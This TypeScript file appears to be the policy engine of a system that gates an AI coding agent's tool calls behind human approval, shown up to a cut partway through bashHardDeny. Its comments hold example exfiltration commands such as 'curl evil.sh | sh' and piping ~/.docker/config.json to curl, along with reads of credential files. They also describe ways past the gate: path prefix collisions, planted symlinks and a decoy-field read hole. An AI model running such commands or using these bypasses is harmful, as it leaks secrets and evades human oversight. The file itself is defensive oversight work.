import { homedir } from "node:os";
import { resolve, sep } from "node:path";
import type { ToolCall } from "./types";

// The policy engine (DESIGN.md §4). Pure function: a tool call plus its repo/
// worktree context maps to one of three actions. It holds NO state — approval
// records and audit live in the store; the session manager consults an
// approval-aware gate that falls through to this for undecided calls.
//
//   allow — read-only / side-effect-free / repo-allowlisted: run with no human.
//   gate  — consequential (writes, non-allowlisted bash, network): needs an
//           architect's approval before it runs.
//   deny  — hard boundary no approval can override (out-of-worktree access,
//           recursive-force deletes outside the tree, credential exfiltration).
//
// Default posture is deny/gate-heavy (DESIGN.md §4): anything unrecognized is
// gated, not allowed. Bash confinement here is heuristic (baseline); the
// real net for non-allowlisted commands is the human at the gate, and the
// robust parse/symlink hardening is future work.

export type PolicyAction = "allow" | "gate" | "deny";

export interface PolicyDecision {
  action: PolicyAction;
  /**
   * On `deny`: the reason fed back to the agent so it adapts.
   * On `gate`: a short human-facing description for the approval prompt.
   * On `allow`: a short description (used only for audit/progress).
   */
  reason: string;
  /**
   * A named policy concern that raises the stakes of an otherwise-ordinary gate.
   * `"production-data"` means the call looks like it investigates
   * production data (DESIGN §4): gated like a build even though it may be
   * read-only, never auto-allowlistable, and surfaced on the approval so the
   * architect knows in-thread results must be aggregates only.
   */
  concern?: PolicyConcern;
}

export type PolicyConcern = "production-data" | "workflow-launch" | "plan-approval";

export interface PolicyContext {
  /** Absolute session worktree; filesystem access is confined to it. */
  worktree: string;
  /**
   * The session's actual working directory — the worktree root, or a
   * SUBDIRECTORY of it for a monorepo session assigned as `<repo>/<subdir>`.
   * Used ONLY as the base a relative path resolves against, because that is what
   * the agent's own tools resolve against. It NEVER participates in the
   * containment test: the boundary is always `worktree`, which sits at or above
   * this. Omitted = the worktree root (the pre-monorepo behaviour).
   */
  cwd?: string;
  /** Repo-defined commands that run without approval (exact or prefix match). */
  safeBashAllowlist: string[];
  /**
   * Subagents enabled for this turn. When on, the MAIN agent may
   * auto-spawn subagents (delegation itself is not a gated action — the subagent's
   * own tool calls are gated downstream). Off = a spawn attempt gates (defensive
   * default; the adapter also removes the tools from context). NOTE: the MAIN
   * agent's WORKFLOW launch is always gated (an architect approves
   * each launch), so there is no `workflowsEnabled` gate flag; when workflows are
   * off the adapter removes the Workflow tool from context entirely.
   */
  subagentsEnabled?: boolean;
  /**
   * The informed worktree-write opt-in. When on, subagent/workflow-
   * origin calls and escaped (un-deferrable) calls may WRITE (confined to the
   * worktree via `offendingPath`) without per-write approval. Bash is NOT relaxed
   * (it has no worktree confinement — see evaluateConfined); out-of-worktree,
   * credential, and production-data access stay hard-denied. Off (default) =
   * read-only fan-out: those calls may only run genuine confined reads.
   */
  workflowWrite?: boolean;
  /**
   * The session's Condotto-owned memory directory, or omitted when the repo has
   * not been vouched for memory.
   *
   * The one place outside the worktree the agent may write, and it earns that with
   * its own narrower rules rather than by joining the containment root set: a `.md`
   * file DIRECTLY in the root (`isMemoryFile`), `Write`/`Edit` only, gated like any
   * other write, never reachable from a subagent/workflow/escaped call, and floored
   * to Bash.
   *
   * This module stays pure and LEXICAL, so it decides shape only. The session
   * manager's gate re-proves every memory target against the filesystem
   * (`verifyMemoryTarget`) before allowing the call — that is what catches a symlink
   * or hard link planted after the last sweep, and it is the real boundary. Do not
   * relax the shape rules here on the assumption that the sweep has already cleaned
   * the directory: a sweep is a snapshot, and the agent keeps acting after it.
   * See DECISIONS 2026-07-20.
   */
  memoryRoot?: string;
  /**
   * The session is in PLAN MODE (`@Condotto plan on`). The agent investigates and
   * proposes a plan; nothing it proposes runs until an architect approves the plan.
   *
   * The rule is "only genuine READS run", not "a gate becomes a deny", and the
   * difference is load-bearing. Two paths reach `allow` without ever passing
   * through `gate`, and both would execute during a supposedly read-only session:
   *   - a fully-allowlisted bash command (`evaluateBash`) — an allowlisted command
   *     is still arbitrary code execution that can write artifacts;
   *   - a confined WRITE under the worktree-write opt-in (`evaluateConfined`), which
   *     a subagent reaches while subagents stay ON during planning.
   * So the collapse below is applied to the DECISION, not to the gate tier.
   *
   * The one exception is the plan-exit tool itself, which gates — that gate IS the
   * feature: it is what posts the plan into the thread for Approve/Deny.
   *
   * Session-scoped rather than tool-scoped, and it lives here rather than in the
   * session-manager gate closure because it depends only on the tool and the
   * context — never on the initiating principal. The principal-dependent widening
   * (architect auto-approve) stays in the closure, per DESIGN §4.
   */
  planMode?: boolean;
  /**
   * Absolute directory the harness runtime writes plan files to, when plan mode
   * is on (the adapter's `settings.plansDirectory`). Always INSIDE the worktree,
   * so this is not a containment exception — `evaluateBase` confines it like any
   * other path, and outside plan mode it is an ordinary directory.
   *
   * Its only job is to name the one write plan mode permits. The headless plan
   * protocol has no plan-exit tool (spike 2026-07-25): the model presents a plan
   * by WRITING it here, and that write carries the whole plan as `content`. So
   * this write is what gates, and its approval is the plan's approval.
   */
  plansDir?: string;
}

/**
 * Fed back to a subagent that reached for a gated action. defer→resume can't
 * pause a subagent call (spike 2026-07-18), so subagents are read-only: any gated
 * action must be performed by the main agent, where it can be approved.
 */
const SUBAGENT_GATED_MSG =
  "Subagents can't run gated actions (writing/editing files, shell commands, deploys) or spawn " +
  "further subagents. Report what's needed and let the main agent do it, so an architect can approve.";

/**
 * Fed back when an "escaped" (un-deferrable) call reaches for a gated action.
 * Such a call can't be paused for approval, so it is denied rather than
 * gated; the main agent must do it on its own turn where it can be approved.
 */
const ESCAPED_GATED_MSG =
  "This action can't be paused for approval from here. The main agent must do it on its own turn, " +
  "one call at a time, so an architect can approve it.";

/**
 * Fed back in plan mode. Deliberately tells the agent what to do INSTEAD, because
 * a bare refusal makes a model retry: the way out of plan mode is to finish
 * investigating and present the plan, not to try the action again.
 */
const PLAN_MODE_MSG =
  "You're in plan mode: nothing is written and nothing runs, including allowlisted commands and " +
  "the test suite. Keep reading and investigating, then present your plan — an architect approves " +
  "it and you implement immediately afterwards.";

/**
 * The approval headline for a plan. A FIXED string: it is rendered into a Slack
 * section and into the notification-fallback text, and the plan is model-authored
 * (injection-reachable) text that is posted as its own message above the buttons.
 * Keeping the headline constant keeps model content out of both.
 */
const PLAN_APPROVAL_SUMMARY = "stop planning and start implementing the plan above";

/** Fed back when the plan-exit tool is reached for outside plan mode. */
const PLAN_EXIT_OFF_MSG =
  "You're not in plan mode, so there's no plan to exit — just do the work. Each consequential " +
  "action is gated normally.";

// Multi-agent meta-tools. Spawning is delegation, not a filesystem
// or shell action; when the capability is enabled the spawn auto-allows and the
// subagent's own tool calls are gated (agent_id-tagged) downstream.
const SUBAGENT_SPAWN_TOOLS = new Set(["Agent", "Task"]);
const WORKFLOW_SPAWN_TOOL = "Workflow";
/**
 * The plan-exit tool. Reachable ONLY in plan mode — the adapter keeps it out of
 * context otherwise, and the deny below is the backstop for that.
 */
const PLAN_EXIT_TOOL = "ExitPlanMode";

// Tool categories. A tool absent from all of these is unknown → gated.
// `ToolSearch` is side-effect-free: it loads tool SCHEMAS on demand. Allowing
// discovery is safe because every actual tool USE it surfaces still flows through
// this gate, and disallowedTools keeps out-of-scope tools out of context. (Note,
// this does NOT restore Grep/Bash for background WORKFLOW sub-agents — the
// SDK blocks their non-default tool loads UPSTREAM of our gate, spike diag5. It
// only helps the main agent / Agent-subagents, and is the correct classification.)
const NO_FS_TOOLS = new Set(["TodoWrite", "ToolSearch"]);
const READ_TOOLS = new Set(["Read", "Glob", "Grep"]);
const WRITE_TOOLS = new Set(["Write", "Edit", "MultiEdit", "NotebookEdit"]);
const NETWORK_TOOLS = new Set(["WebFetch", "WebSearch"]);
/**
 * The ONLY tools a subagent may run: genuine confined reads plus the
 * side-effect-free planning tool. Note Bash is excluded even when allowlisted —
 * an allowlisted command (e.g. the repo test command) is still code execution, so
 * it is not "read-only" for a subagent and must go to the main agent.
 */
const SUBAGENT_READ_TOOLS = new Set([...NO_FS_TOOLS, ...READ_TOOLS]);

/** Fields across tool inputs that name a filesystem target. */
const PATH_FIELDS = ["file_path", "path", "notebook_path"] as const;

const allow = (reason: string): PolicyDecision => ({ action: "allow", reason });
const gate = (reason: string, concern?: PolicyConcern): PolicyDecision => ({ action: "gate", reason, concern });
const deny = (reason: string): PolicyDecision => ({ action: "deny", reason });

/**
 * The first path field (if any) that resolves outside the worktree.
 * Returns null when every present path is confined.
 *
 * TWO distinct paths are involved, and conflating them is a security bug:
 *
 *  - `worktree` is the containment ROOT — the boundary. Always.
 *  - `base` is what a RELATIVE input resolves against, defaulting to the root.
 *    For a monorepo session the harness cwd is a subdirectory, and the agent's
 *    own tools resolve relative paths against that cwd — so we must too, or we
 *    misjudge every relative path. From cwd `<wt>/apps/report`, the agent's
 *    `../../packages/shared/x.ts` really means `<wt>/packages/shared/x.ts`,
 *    which is inside the worktree and must be allowed.
 *
 * THE INVARIANT: containment is computed only from `root`, never from `base`.
 * A deeper base therefore cannot widen the boundary — it can only relocate a
 * path WITHIN it. Absolute inputs and `~` ignore the base entirely, so
 * `/etc/passwd` and `~/.aws/credentials` deny regardless of cwd.
 *
 * Resolution is purely lexical — `path.resolve` never follows symlinks
 * (symlink-chasing for in-tree content is future hardening). That is why `base`
 * must be a path Condotto has already realpath-validated at assign time: it
 * names repo content, and a subdirectory that is a symlink out of the tree would
 * otherwise make every lexically-inside path a real escape.
 */
export function offendingPath(worktree: string, input: unknown, base?: string): string | null {
  const root = resolve(worktree);
  // Never derived from `base` — see THE INVARIANT above.
  const from = base === undefined ? root : resolve(base);
  for (const { value, target } of pathTargets(input, from)) {
    if (!containedIn(target, root)) return value;
  }
  return null;
}

/**
 * THE containment test, in exactly one place. `+ sep` is what defeats the
 * prefix-collision attack: without it `<wt>-evil/x` would pass as "inside `<wt>`".
 */
function containedIn(target: string, root: string): boolean {
  return target === root || target.startsWith(root + sep);
}

/**
 * Every filesystem target named by a tool input, resolved against `from`.
 * Shared by the worktree and memory checks so the two can never disagree about
 * what a given input actually points at.
 */
function pathTargets(input: unknown, from: string): { value: string; target: string }[] {
  if (typeof input !== "object" || input === null) return [];
  const out: { value: string; target: string }[] = [];
  for (const field of PATH_FIELDS) {
    const value = (input as Record<string, unknown>)[field];
    if (typeof value !== "string" || value.length === 0) continue;
    // A leading `~` is never a legitimate in-worktree relative path; expand it
    // as a shell/tool would rather than let node treat it as a literal subdir.
    const expanded = value === "~" || value.startsWith("~/") ? homedir() + value.slice(1) : value;
    out.push({ value, target: resolve(from, expanded) });
  }
  return out;
}

/**
 * The first path field (if any) that targets the session's MEMORY root — the one
 * place outside the worktree the agent may touch (DECISIONS 2026-07-20).
 *
 * This is deliberately NOT expressed by making `offendingPath` take a set of roots.
 * Memory is not "another worktree": it is readable but writable only as `.md`
 * through `Write`/`Edit`, never reachable from a subagent or from Bash, and it
 * OUTLIVES the worktree. Folding it into the containment root set would grant all
 * of those by default and leave the differences to be re-subtracted downstream —
 * the shape most likely to leak one by omission. Keeping it a separate, named
 * question means each rule has to be stated on purpose.
 *
 * `base` — the session cwd — is REQUIRED and has no default, unlike
 * `offendingPath`'s. Defaulting it to the memory root would resolve every RELATIVE
 * path there, so an ordinary `Read src/index.ts` would look like a memory access
 * and (in `evaluateConfined`) be denied to every subagent. Memory is only ever
 * addressable by absolute path; a relative one resolves inside the worktree and
 * must never reach here.
 *
 * The root passed in has already been realpath-proven and symlink-swept by
 * `MemoryManager.prepare`, which is what keeps this test lexical — and this whole
 * module pure and synchronous.
 */
export function memoryPath(memoryRoot: string, input: unknown, base: string): string | null {
  const root = resolve(memoryRoot);
  const from = resolve(base);
  for (const { value, target } of pathTargets(input, from)) {
    if (containedIn(target, root)) return value;
  }
  return null;
}

/**
 * Every ABSOLUTE target of this input that lands under the memory root, legal shape
 * or not. The session-manager gate re-proves each against the filesystem before
 * allowing the call — see `verifyMemoryTarget`. Returns absolute paths (unlike
 * `memoryPath`, which returns the raw input value for error messages).
 */
export function memoryTargets(memoryRoot: string, input: unknown, base: string): string[] {
  const root = resolve(memoryRoot);
  return pathTargets(input, resolve(base))
    .filter((t) => containedIn(t.target, root))
    .map((t) => t.target);
}

/**
 * A legal memory FILE: a direct `.md` child of the memory root. Nothing else.
 *
 * The shape is the security control, not tidiness. Allowing arbitrary depth under
 * the root made one planted directory symlink (`<mem>/r -> /`) into a general host
 * read channel, because `<mem>/r/etc/passwd` is lexically "inside memory" and reads
 * there are auto-allowed. Requiring a DIRECT child means no path can traverse
 * THROUGH a link at all — the only reachable shape is a single filename, so the
 * remaining risk narrows to a link that IS a memory file, which the session
 * manager's per-call `verifyMemoryTarget` resolves for real before allowing it.
 *
 * The filename charset also refuses `..`, separators, and control characters, so a
 * "direct child" cannot be spelled as an escape.
 */
export function isMemoryFile(memoryRoot: string, absTarget: string): boolean {
  const root = resolve(memoryRoot);
  if (!containedIn(absTarget, root) || absTarget === root) return false;
  const rel = absTarget.slice(root.length + 1);
  if (rel.includes(sep) || rel.includes("/")) return false; // direct child only
  return /^[A-Za-z0-9][A-Za-z0-9._-]*\.md$/.test(rel);
}

/**
 * A `..` segment in a Glob PATTERN is refused outright rather than resolved.
 *
 * `offendingPath` checks a pattern lexically, but glob metacharacters aren't
 * paths: `**` resolves as a single literal segment while the real expansion
 * walks arbitrarily deep. That mismatch gives a pattern more lexical headroom
 * than it should have, and the headroom grows with the depth of the resolution
 * base — so a monorepo subdir session would amplify it. Refusing `..` in a
 * pattern removes the amplification entirely and costs the agent nothing: it can
 * scope with Glob's `path` field plus a relative pattern, or an absolute
 * in-worktree pattern.
 */
function globPatternEscapes(pattern: unknown): boolean {
  if (typeof pattern !== "string") return false;
  return pattern.split(/[\\/]/).includes("..");
}

/**
 * Classify a tool call (DESIGN §4). Dispatches on the call's ORIGIN first: a
 * subagent/workflow-agent call OR an "escaped" un-deferrable call
 * is CONFINED — it can't be paused for approval, so gated actions are
 * denied (read-only), unless the worktree-write opt-in allows confined writes.
 * The main agent may spawn subagents/workflows when enabled; everything else runs
 * the base tool-semantics rules.
 */
export function evaluate(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  const name = call.name;

  // A subagent/workflow-agent call (agentId set — subagent, and workflow
  // agents under bypassPermissions) or an escaped call that reached the harness's
  // un-deferrable backstop. Both are confined: they can't defer, so a would-
  // be gate becomes a deny (read-only), unless the architect opened worktree writes.
  if (call.agentId || call.escaped) return evaluateConfined(call, ctx);

  // Main agent spawning a subagent / workflow. Delegation is not itself a gated
  // action when the architect enabled the capability; the disallowedTools set
  // already removes these from context when it's off, so the gate branch is a
  // deny-heavy backstop.
  if (SUBAGENT_SPAWN_TOOLS.has(name)) {
    // Checked BEFORE the plan-mode collapse below: parallel read-only
    // investigation is exactly what planning is for, and a subagent's own calls
    // are confined downstream by evaluateConfined regardless of mode.
    return ctx.subagentsEnabled ? allow("delegate to a subagent") : gate("delegate to a subagent");
  }

  // Plan mode: only genuine READS run. See PolicyContext.planMode for why this
  // collapses the DECISION rather than the gate tier — allowlisted bash and
  // opt-in confined writes both return `allow` and would otherwise slip through.
  if (ctx.planMode) {
    // Forward-compat: a future SDK that restores the plan-exit tool must gate it
    // rather than let the model exit plan mode on its own authority. It does not
    // exist headless today (spike 2026-07-25), so this branch is currently dead —
    // deliberately, because the failure mode if it comes back is silent.
    if (name === PLAN_EXIT_TOOL) return gate(PLAN_APPROVAL_SUMMARY, "plan-approval");
    const base = evaluateBase(call, ctx);
    // A hard boundary keeps its own specific reason (out-of-worktree, credential,
    // `rm -rf`) — the collapse must never blur "refused outright" into "not yet".
    if (base.action === "deny") return base;
    if (base.action === "allow" && (NO_FS_TOOLS.has(name) || READ_TOOLS.has(name))) return base;
    // THE plan write: how a plan is presented, and therefore the one gate that
    // exists in plan mode. `base` was already `gate` (an in-worktree write), so
    // this widens nothing — it only tags the concern so the session manager posts
    // the plan instead of a generic "approve this write?".
    if (isPlanWrite(call, ctx)) return gate(PLAN_APPROVAL_SUMMARY, "plan-approval");
    return deny(PLAN_MODE_MSG);
  }
  if (name === PLAN_EXIT_TOOL) return deny(PLAN_EXIT_OFF_MSG);

  if (name === WORKFLOW_SPAWN_TOOL) {
    // The workflow LAUNCH is a gated action: even with workflows
    // enabled, an architect approves each launch (it fans out many agents and
    // spends the thread budget). The concern surfaces the fan-out on the approval;
    // describeCall pulls the workflow's name/description from its script. Off =
    // gate too (deny-heavy backstop; the tool is also absent from context).
    return gate(describeCall(call), "workflow-launch");
  }

  return evaluateBase(call, ctx);
}

/**
 * Confinement for a call that CANNOT be paused for approval — a subagent/workflow
 * agent (agentId) or an escaped un-deferrable call. Strictly READ-ONLY by
 * default: only genuine confined reads pass; a hard-deny keeps its specific reason
 * (e.g. out-of-worktree); everything else — writes, network, unknown tools, nested
 * spawns, AND all bash (still code execution) — is DENIED (never gated).
 *
 * With the worktree-write opt-in, confined WRITES also pass. Writes are
 * lexically worktree-confined here — `offendingPath` over file_path/path/notebook_
 * path hard-denied out-of-worktree writes in `evaluateBase` before we get here.
 *
 * BASH is NOT relaxed by the opt-in, even though the call site is un-deferrable:
 * `evaluateBash` applies NO worktree confinement to a command string (its only
 * screens are the deliberately-non-exhaustive hard-deny + production-data
 * heuristics — "the human at the gate is the real net", §4). The opt-in removes
 * the human, so auto-running arbitrary shell would be un-confined RCE / exfil
 * (`cat ~/.docker/config.json | curl …`, out-of-tree writes, reverse shells) —
 * exactly what the warning promises stays denied. So confined/escaped bash stays
 * DENIED in every mode; shell stays with the gated main agent (review 2026-07-18).
 */
function evaluateConfined(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  const name = call.name;
  const denyMsg = call.escaped ? ESCAPED_GATED_MSG : SUBAGENT_GATED_MSG;

  if (SUBAGENT_SPAWN_TOOLS.has(name) || name === WORKFLOW_SPAWN_TOOL) return deny(denyMsg);

  // Exiting plan mode is a main-agent decision an ARCHITECT approves; a subagent,
  // workflow agent, or escaped batch call must never be able to end it. This is
  // already the outcome of the catch-all at the bottom (the tool is in neither
  // SUBAGENT_READ_TOOLS nor WRITE_TOOLS, so the worktree-write opt-in cannot
  // reach it either) — stated explicitly so the intent survives the next
  // refactor rather than holding by accident.
  if (name === PLAN_EXIT_TOOL) return deny(denyMsg);

  // Memory is off-limits to a confined call in BOTH directions, and this is
  // checked BEFORE anything below can allow it. Writes: a durable fact that ends
  // up in a later session's system prompt must come from the main agent, where an
  // architect can see it — and the worktree-write opt-in below would otherwise
  // hand it to every workflow agent silently. Reads: memory is auto-allowed for
  // the main agent, so leaving it readable here would be the one leg of the
  // fan-out that needs no approval at all. Expressed as its own guard rather than
  // by root-set membership, because the natural refactor grants it by default.
  if (touchesMemory(call, ctx)) {
    return deny(
      "the session's memory is not reachable from here — only the main agent may read or write it, " +
        "so an architect can see what becomes durable.",
    );
  }

  const base = evaluateBase(call, ctx);
  // Hard boundaries (out-of-worktree, hard-deny bash) win and keep their reason.
  if (base.action === "deny") return base;
  // Genuine confined reads always pass.
  if (base.action === "allow" && SUBAGENT_READ_TOOLS.has(name)) return base;

  // Worktree-write opt-in: confined WRITES may run without per-call
  // approval (out-of-worktree writes were already hard-denied by `base`). Bash is
  // intentionally excluded — see the docstring; it has no worktree confinement.
  //
  // PLAN MODE turns the opt-in off for the duration, and this is the one place it
  // can be done. `evaluate` dispatches a confined call here at its FIRST branch,
  // before the plan-mode collapse ever runs, so a plan-mode check that lives only
  // there is unreachable from a subagent — and subagents stay enabled while
  // planning, so the fan-out would write files during a session that reports
  // itself read-only. The escaped (batched) path lands here too, which is a
  // main-agent write reaching the same line. The opt-in's consent was "this agent,
  // which knows what it is doing, may write unattended"; plan mode's contract is
  // that nothing is written until the plan is approved, and the narrower one wins.
  if (ctx.workflowWrite && !ctx.planMode && WRITE_TOOLS.has(name)) return allow(describeCall(call));
  if (ctx.workflowWrite && ctx.planMode && WRITE_TOOLS.has(name)) return deny(PLAN_MODE_MSG);

  // Anything else — bash, network, unknown, and every write when the opt-in is off —
  // can't run un-deferred here.
  return deny(denyMsg);
}

/**
 * Does this call reach for the session's memory in ANY way? Covers the ordinary
 * path fields AND Glob's `pattern`, which is a path glob in its own right and is
 * NOT one of `PATH_FIELDS` — checking only the path fields would leave
 * `Glob{pattern: "<memory>/*.md"}` readable from a subagent, the one fan-out leg
 * that needs no approval. Bash is excluded on purpose: it names no path field, and
 * is floored against memory in `bashHardDeny` instead.
 */
function touchesMemory(call: ToolCall, ctx: PolicyContext): boolean {
  if (!ctx.memoryRoot) return false;
  const from = ctx.cwd ?? ctx.worktree;
  if (memoryPath(ctx.memoryRoot, call.input, from) !== null) return true;
  if (call.name !== "Glob") return false;
  const pattern = (call.input as Record<string, unknown> | null)?.pattern;
  return memoryPath(ctx.memoryRoot, { path: pattern }, from) !== null;
}

/**
 * A denial reason tailored to a path that lands under the memory root but is not a
 * legal memory file — "outside your worktree" would be true but useless there, and
 * an agent that cannot tell "forbidden" from "wrong shape" just retries.
 */
function outsideReason(value: string, ctx: PolicyContext, from: string): string | null {
  if (!ctx.memoryRoot) return null;
  const target = resolve(from, value === "~" || value.startsWith("~/") ? homedir() + value.slice(1) : value);
  if (!containedIn(target, resolve(ctx.memoryRoot))) return null;
  return (
    `"${value}" isn't a usable memory path. Memory holds markdown files directly in ` +
    `${ctx.memoryRoot} — no subdirectories — so use a plain name like \`some-fact.md\`.`
  );
}

/** Base tool-semantics rules (origin-agnostic): reads/writes/bash/network/unknown. */
function evaluateBase(call: ToolCall, ctx: PolicyContext): PolicyDecision {
  const name = call.name;

  // Side-effect-free meta tools: always fine, touch no filesystem.
  if (NO_FS_TOOLS.has(name)) return allow(name === "ToolSearch" ? "loads a tool definition" : "updates its task plan");

  const offender = offendingPath(ctx.worktree, call.input, ctx.cwd);
  // Memory vs. escape, decided over the WHOLE set of path targets rather than by
  // comparing two independent first-matches.
  //
  // The first-match form was a critical hole (review 2026-07-20): a memory target
  // is out-of-worktree BY DEFINITION, so a memory-valued `file_path` was both the
  // first offender and the first memory hit, they compared equal, and a second
  // field escaping to anywhere on the host was silently discarded —
  // `Grep{file_path:"<mem>/MEMORY.md", path:"/etc"}` came back ALLOW. Grep ignores
  // `file_path`, so the decoy cost nothing and the read was auto-allowed with no
  // approval record, on a member's turn.
  //
  // The rule now: ANY out-of-worktree target that is not a valid memory file is an
  // escape, and the memory branch is taken only when EVERY out-of-worktree target
  // is one. One list, both questions.
  const from = resolve(ctx.cwd ?? ctx.worktree);
  const outside = pathTargets(call.input, from).filter(
    (t) => !containedIn(t.target, resolve(ctx.worktree)),
  );
  const isMemory = (t: { target: string }) =>
    ctx.memoryRoot !== undefined && isMemoryFile(ctx.memoryRoot, t.target);
  const escapedPath = outside.find((t) => !isMemory(t))?.value ?? null;
  const memory = outside.length > 0 && outside.every(isMemory) ? outside[0]!.value : null;

  if (READ_TOOLS.has(name)) {
    // Reading anything on the host + posting the answer in a thread is an
    // exfiltration channel — reads are confined like writes (DESIGN.md §4).
    // Glob's `pattern` is itself a path glob (it can be absolute or contain
    // `..`) and drives enumeration on its own, so it must be confined too;
    // Grep's `pattern` is a regex scoped by the (already-checked) `path`.
    const pattern = (call.input as Record<string, unknown> | null)?.pattern;
    if (name === "Glob" && globPatternEscapes(pattern)) {
      return deny(
        `"${String(pattern)}" uses ".." in a glob pattern, which isn't allowed — a pattern is ` +
          `matched, not resolved. Scope the search with Glob's "path" field and a pattern ` +
          `relative to it instead.`,
      );
    }
    // A Glob pattern is confined to the WORKTREE with no memory carve-out. Memory
    // is addressed one file at a time (`MEMORY.md` is the index the agent reads to
    // find the rest), so enumeration buys it nothing — and a pattern is matched
    // rather than resolved, which is exactly the mismatch that would let a glob
    // walk through anything planted under the root.
    const globEscape =
      name === "Glob" ? offendingPath(ctx.worktree, { path: pattern }, ctx.cwd) : null;
    const escaped = escapedPath ?? globEscape;
    if (escaped) {
      return deny(
        outsideReason(escaped, ctx, from) ??
          `"${escaped}" is outside your worktree. You may only read files inside your own working tree.`,
      );
    }
    // Reading memory is free, exactly like reading the worktree: it holds only
    // notes this session lineage wrote, so it leaks nothing a read of the tree
    // would not. (It is agent-authored, hence "notes, not authority" in the prompt.)
    return allow(describeCall(call));
  }

  if (WRITE_TOOLS.has(name)) {
    // A write outside the worktree is a hard boundary no approval can widen —
    // EXCEPT the session's own memory root, which has its own narrower rules.
    if (memory !== null && escapedPath === null) {
      // Write/Edit only. MultiEdit and NotebookEdit are refused because the
      // approval prompt renders a diff only for Edit (render.ts), so approving
      // them would be content-blind — and memory is precisely the content that
      // must not change unseen: it lands in a LATER session's system prompt.
      if (name !== "Write" && name !== "Edit") {
        return deny(
          `use Write or Edit for memory files — ${name} isn't allowed there, because an ` +
            `architect approving a memory change has to be able to see the content.`,
        );
      }
      // Gated like any in-worktree write: architect auto-approve covers it
      // silently on their own turn, a member's turn surfaces one Approve click.
      // (The `.md`-direct-child shape was already enforced by `isMemoryFile` above —
      // anything else fell through to `escapedPath` and denied as an escape.)
      return gate(describeCall(call));
    }
    if (escapedPath ?? offender) {
      const bad = (escapedPath ?? offender)!;
      return deny(
        outsideReason(bad, ctx, from) ??
          `"${bad}" is outside your worktree. Writes are confined to your own working tree.`,
      );
    }
    return gate(describeCall(call));
  }

  if (name === "Bash") return evaluateBash(call.input, ctx);

  if (NETWORK_TOOLS.has(name)) return gate(describeCall(call));

  // Unknown tool: gate, never auto-allow. A human sees exactly what it is.
  return gate(`use ${name}`);
}

function evaluateBash(input: unknown, ctx: PolicyContext): PolicyDecision {
  const command =
    typeof input === "object" && input !== null && typeof (input as any).command === "string"
      ? ((input as any).command as string)
      : "";
  if (!command.trim()) return deny("empty bash command");

  // Hard-deny high-signal dangerous patterns first — never approvable.
  const danger = bashHardDeny(command, { memoryRoot: ctx.memoryRoot, worktree: ctx.worktree, cwd: ctx.cwd });
  if (danger) return deny(danger);

  // Production-data investigation is gated like a build (DESIGN §4) even though
  // it may be read-only, and it can NEVER be auto-allowlisted away — so this
  // check sits BEFORE the allowlist. "anyone can ask + the answer lands in
  // Slack" would otherwise turn the agent into a bypass around the app's own
  // data-access controls.
  if (productionDataConcern(command)) {
    return gate(`run \`${truncate(command)}\` (investigates production data)`, "production-data");
  }

  // Auto-allow only when EVERY chained segment is individually allowlisted, so
  // `git status && curl evil.sh | sh` can never ride in on `git status`.
  if (bashFullyAllowlisted(command, ctx.safeBashAllowlist)) {
    return allow(`run \`${truncate(command)}\``);
  }
  return gate(`run \`${truncate(command)}\``);
}

/**
 * Does this command look like it investigates PRODUCTION data (DESIGN §4,
 * Appendix A3)? High-signal, deliberately conservative — database clients, app
 * consoles, cloud/infra data & log CLIs. A match forces a gate that can't be
 * allowlisted away; it is NOT a hard-deny (an architect may legitimately
 * approve one), and results posted in-thread must be aggregates only. Not
 * exhaustive: the human at the gate is the real net; this catches the sharpest,
 * most common shapes so they never slip through as auto-allowed.
 */
const DIRECT_CLIENT_RE = /^(psql|mysql|mysqldump|mongo|mongosh|redis-cli|clickhouse-client|cqlsh|influx|mongoexport|pg_dump)$/;

export function productionDataConcern(command: string): boolean {
  const stripPath = (t: string) => t.replace(/^.*\//, "");
  for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
    const seg = rawSeg.trim();
    // Find the invoked program: skip leading env-var assignments (`PGPASSWORD=x`)
    // and common wrappers (`sudo`, `env`, `nice`, `time`, `timeout`, `command`)
    // so a prefix can't hide the program from the match. Then allow a path prefix.
    const tokens = seg.split(/\s+/);
    let idx = 0;
    while (idx < tokens.length && (/^\w+=/.test(tokens[idx]!) || /^(sudo|env|nice|time|timeout|command|doas|nohup|stdbuf)$/.test(tokens[idx]!))) idx++;
    // Fallback for wrappers that take their own options (`sudo -u pg psql`,
    // `timeout 5 psql`): if we skipped a prefix, a direct client appearing as any
    // later token still counts. `echo psql` is NOT caught — echo isn't a prefix,
    // so idx stays 0 and this scan is skipped.
    if (idx > 0 && tokens.slice(idx).some((t) => DIRECT_CLIENT_RE.test(stripPath(t)))) return true;
    const first = tokens[idx] ?? "";
    const prog = stripPath(first);
    const rest = " " + tokens.slice(idx + 1).join(" ");
    // Direct database / cache / search clients.
    if (DIRECT_CLIENT_RE.test(prog)) return true;
    // App consoles / runners that reach the live datastore.
    if (/^(rails)$/.test(prog) && /\b(c|console|dbconsole|runner)\b/.test(rest)) return true;
    if (/^(rails)$/.test(prog) && rest.trim() === "") return true;
    if (/^(django-admin)$/.test(prog) && /\b(shell|dbshell|shell_plus)\b/.test(rest)) return true;
    // manage.py may be run via an interpreter (`python manage.py shell`), so
    // match it anywhere in the segment rather than only as the first token.
    if (/(?:^|[\s\/])manage\.py\s+(shell|dbshell|shell_plus)\b/.test(seg)) return true;
    if (/^(heroku|flyctl|fly|doctl|kubectl|wrangler)$/.test(prog) && /\b(run|console|logs|exec|db|psql|proxy)\b/.test(rest)) return true;
    // Cloud data & log services (read of prod data / logs).
    if (/^aws$/.test(prog) && /\b(s3|rds|dynamodb|logs|athena|redshift|secretsmanager|ssm)\b/.test(rest)) return true;
    if (/^(gcloud|bq|gsutil)$/.test(prog) && /\b(sql|logging|logs|bigquery|storage|secrets)\b/.test(rest)) return true;
    if (/^az$/.test(prog) && /\b(sql|cosmosdb|storage|monitor|keyvault)\b/.test(rest)) return true;
  }
  return false;
}

/**
 * A small, deliberately conservative denylist of things no architect should be
 * able to approve by a mis-click. NOT exhaustive — the gate (human approval) is
 * the real net for everything non-allowlisted; this only catches the sharpest
 * edges. Hardening (full shell parsing, more patterns) is future work.
 */
export function bashHardDeny(
  command: string,
  ctx?: { memoryRoot?: string; worktree?: string; cwd?: string },
): string | null {
  const memoryRoot = ctx?.memoryRoot;
  const worktree = ctx?.worktree;
  const base = ctx?.cwd ?? ctx?.worktree;
  // Keep the shell out of the memory directory, so memory changes only through the
  // path-checked write tools and every change is gated and audited. This fires in
